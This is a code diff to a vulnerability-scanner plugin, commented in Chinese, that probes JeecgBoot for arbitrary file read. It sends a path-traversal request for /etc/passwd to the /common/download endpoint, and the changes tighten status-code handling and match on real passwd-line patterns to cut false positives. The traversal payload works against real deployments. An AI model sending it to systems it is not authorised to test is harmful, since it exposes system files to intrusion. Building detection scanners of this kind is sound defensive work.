@@ -1,8 +1,10 @@
 # JeecgBoot 任意文件读取：/common/download 接口路径穿越（root: 特征，零破坏）
+import requests
+
 from common.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
 from core.http import join_url
 from lib.colors import no, ok
-from lib.matcher import match_all
+from lib.matcher import match_file_read_leak
 from lib.reporter import emit
 from plugins.base import PluginBase
 
@@ -41,13 +43,22 @@ class JeecgFileReadDownloadPlugin(PluginBase):
         # 6 级 ../ 覆盖常见容器/应用部署层级；/etc/passwd 为 Linux 稳定存在、特征明确的文件
         url = join_url(target, "/jeecg-boot/common/download?fileName=../../../../../../etc/passwd")
         try:
-            text = session.get(url).text or ""
-        except Exception as e:
-            # 网络异常归 UNKNOWN：测不到 ≠ 安全，避免漏报
+            resp = session.get(url)
+        except requests.exceptions.RequestException as e:
+            # 网络异常归 UNKNOWN：测不到 ≠ 安全，避免漏报。
+            # 仅捕获传输异常：响应/编程错误不再被伪装成网络故障
             emit(no("JeecgBoot 任意文件读取（网络异常）"))
             return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))
-        # 双特征判定：root 账户名 + passwd 行分隔符 ":/"，避免页面恰含 root 字样造成误报
-        if match_all(text, ["root", ":/"]):
+        # .text 访问移出 try：确属请求失败才归 UNKNOWN
+        text = resp.text or ""
+        # 状态码门禁：4xx/5xx 错误页、WAF 拦截页一律不参与内容匹配，避免把错误页当文件内容
+        if resp.status_code != 200:
+            emit(no(f"JeecgBoot 任意文件读取（HTTP {resp.status_code}）"))
+            return ScanResult(kind="vuln", name=self.name, status=STATUS_SAFE, url=url, evidence=f"HTTP {resp.status_code}")
+        # 强特征判定：仅当响应含真实 /etc/passwd 行格式（root:x:0:0: / daemon:x:1:1: 等）才算命中。
+        # 加固说明：原判据 match_all(text, ["root", ":/"]) 过弱——":/" 在任意含 URL 的页面都出现，
+        # "root" 更是 HTML/JS/报错页的常客，一份普通 404 页即可满足，造成确定性误报。
+        if match_file_read_leak(text):
             emit(ok("存在 JeecgBoot 任意文件读取"))
             return ScanResult(
                 kind="vuln",
@@ -55,7 +66,7 @@ class JeecgFileReadDownloadPlugin(PluginBase):
                 severity=self.severity,
                 status=STATUS_CONFIRMED,
                 url=url,
-                evidence="响应含 root 与 :/ 特征（/etc/passwd）",
+                evidence="响应含 /etc/passwd 真实行特征（如 root:x:0:0:）",
                 fix=self.fix,
                 extra={"vuln_type": "arbitrary_file_read", "plugin_name": "jeecg_file_read"},
             )
